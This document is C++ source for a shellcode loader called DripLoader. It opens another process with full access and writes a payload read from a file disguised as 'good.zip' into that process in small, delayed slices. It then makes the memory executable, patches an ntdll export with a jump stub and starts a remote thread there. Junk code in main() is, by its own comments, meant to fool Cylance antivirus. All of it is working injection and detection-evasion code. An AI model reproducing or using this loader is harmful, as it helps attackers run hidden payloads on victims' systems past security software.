#include "DripLoader.h"

// ntdll.dll
char jmpModName[]{ 'n','t','d','l','l','.','d','l','l','\0' };
// RtlpWow64CtxFromAmd64
char jmpFuncName[]{ 'R','t','l','p','W','o','w','6','4','C','t','x','F','r','o','m','A','m','d','6','4','\0' };
// blob.bin
char fnamScBlob[]{ 'g','o','o','d','.','z','i','p','\0' };

LPVOID PrepEntry(HANDLE hProc, LPVOID vm_base)
{
    unsigned char* b = (unsigned char*)&vm_base;

    unsigned char jmpSc[7]{
        0xB8, b[0], b[1], b[2], b[3],
        0xFF, 0xE0
    };

    // find the export EP offset
    HMODULE hJmpMod = LoadLibraryExA(
        jmpModName,
        NULL,
        DONT_RESOLVE_DLL_REFERENCES
    );

    if (!hJmpMod)
        return nullptr;

    LPVOID  lpDllExport = GetProcAddress(hJmpMod, jmpFuncName);

    DWORD   offsetJmpFunc = (DWORD)lpDllExport - (DWORD)hJmpMod;

    LPVOID  lpRemFuncEP{ 0 };

    HMODULE hMods[1024];
    DWORD   cbNeeded;
    char    szModName[MAX_PATH];
    
    if (EnumProcessModules(hProc, hMods, sizeof(hMods), &cbNeeded))
    {
        int i;
        for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            if (GetModuleFileNameExA(hProc, hMods[i], szModName, sizeof(szModName) / sizeof(char)))
            {
                if (strcmp(PathFindFileNameA(szModName), jmpModName)==0) {
                    lpRemFuncEP = hMods[i];
                    break;
                }
            }
        }
    }

    lpRemFuncEP = (LPVOID)((DWORD_PTR)lpRemFuncEP + offsetJmpFunc);

    if (NULL == lpRemFuncEP)
        return nullptr;

    SIZE_T szWritten{ 0 };
    WriteProcessMemory(
        hProc,
        lpDllExport,
        jmpSc,
        sizeof(jmpSc),
        &szWritten
    );

    return lpDllExport;
}

int run(int tpid, HANDLE hProc, DWORD szPage, DWORD szAllocGran, const char* fnam, int msStepDelay)
{
    DWORD szSc{ 0 };

    unsigned char* shellcode = ReadProcessBlob(fnam, &szSc);

    if (NULL == szSc)
        return 2;
    
    SIZE_T szVmResv{ szAllocGran };
    SIZE_T szVmCmm{ szPage };
    DWORD  cVmResv = (szSc / szVmResv) + 1;
    DWORD  cVmCmm = szVmResv / szVmCmm;

    LPVOID vmBaseAddress = GetSuitableBaseAddress(
        hProc, 
        szVmCmm, 
        szVmResv, 
        cVmResv
    );

    if (nullptr == vmBaseAddress)
        return 3;

    double di;

    NTSTATUS  status{ 0 };
    DWORD     cmm_i;
    LPVOID    currentVmBase{ vmBaseAddress };
    
    vector<LPVOID>  vcVmResv;
    
    // Reserve enough memory
    DWORD i;
    for (i = 1; i <= cVmResv; ++i) 
    {
        Sleep(msStepDelay);

        status = ANtAVM(
            hProc,
            &currentVmBase,
            NULL, 
            &szVmResv,
            MEM_RESERVE, 
            PAGE_NOACCESS
        );

        if (STATUS_SUCCESS == status)
            vcVmResv.push_back(currentVmBase);
        else
            return 4;

        currentVmBase = (LPVOID)((DWORD_PTR)currentVmBase + szVmResv);
    }

    DWORD           offsetSc{ 0 };
    DWORD           oldProt;

    // Loop over the pages and commit our sc blob in 4kB slices
    double prcDone{ 0 };
    for (i = 0; i < cVmResv; ++i) 
    {
        for (cmm_i = 0; cmm_i < cVmCmm; ++cmm_i) 
        {
            prcDone += 1.0 / cVmResv / cVmCmm;

            DWORD offset = (cmm_i * szVmCmm);
            currentVmBase = (LPVOID)((DWORD_PTR)vcVmResv[i] + offset);

            Sleep(msStepDelay);

            status = ANtAVM(
                hProc, 
                &currentVmBase, 
                NULL, 
                &szVmCmm, 
                MEM_COMMIT, 
                PAGE_READWRITE
            );

            SIZE_T szWritten{ 0 };

            Sleep(msStepDelay);

            status = ANtWVM(
                hProc, 
                currentVmBase, 
                &shellcode[offsetSc], 
                szVmCmm, 
                &szWritten
            );

            offsetSc += szVmCmm;

            Sleep(msStepDelay);

            status = ANtPVM(
                hProc, 
                &currentVmBase, 
                &szVmCmm, 
                PAGE_EXECUTE_READ, 
                &oldProt
            );
        } 
    }

    Sleep(10000 + msStepDelay);

    LPVOID entry = PrepEntry(hProc, vmBaseAddress);

    HANDLE hThread{ nullptr };

    Sleep(10000 + msStepDelay);

    ANtCTE(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProc,
        (LPTHREAD_START_ROUTINE)entry,
        NULL,
        NULL,
        0,
        0,
        0,
        nullptr
    );

    return ERROR_SUCCESS;
}


int main(int argc, char *argv[])
{
    if (8 != sizeof(void*)) 
        return -1;

    int tpid{ 0 };
    int msStepDelay{ 0 };
    
    //////// throw some dumb stuff at cylance so its cylent 
    char* omg = (char*)"priority queue";

    if(strcmp("", "yes sir")) 
        printf("yes yes!\na very important message here");

    if(strcpy(omg,"michael jackson"))
        if (strcmp("yes", "yes"))
            printf_s("for sure!!");

    if(isless(1131, 223491))
        printf(omg);

    int cylanceplease{ 0 };
    cylanceplease = GetLastError();

    GetConsoleTitle(nullptr, NULL);
    system("cls");
    EnableAnsiSupport();
    /////// ok we can continue now

    if (argc == 3) {
        tpid = (int)strtol(argv[1], NULL, 10);
        msStepDelay = (int)strtol(argv[2], NULL, 10);   
    }
    else {
        return -1;
    }
    
    HANDLE hProc = OpenProcess(
        PROCESS_ALL_ACCESS, 
        FALSE, 
        tpid
    );

    if (NULL == hProc) 
        return -1; 

    SYSTEM_INFO sys_inf;
    GetSystemInfo(&sys_inf);

    DWORD page_size{ sys_inf.dwPageSize };
    DWORD alloc_gran{ sys_inf.dwAllocationGranularity };

    // still do it
    if (NULL == page_size)
        page_size = 0x1000;

    if (NULL == alloc_gran)
        alloc_gran = 0x10000;

    int ret = run(
        tpid, 
        hProc, 
        page_size, 
        alloc_gran, 
        fnamScBlob, 
        msStepDelay
    );

    return ret;
}
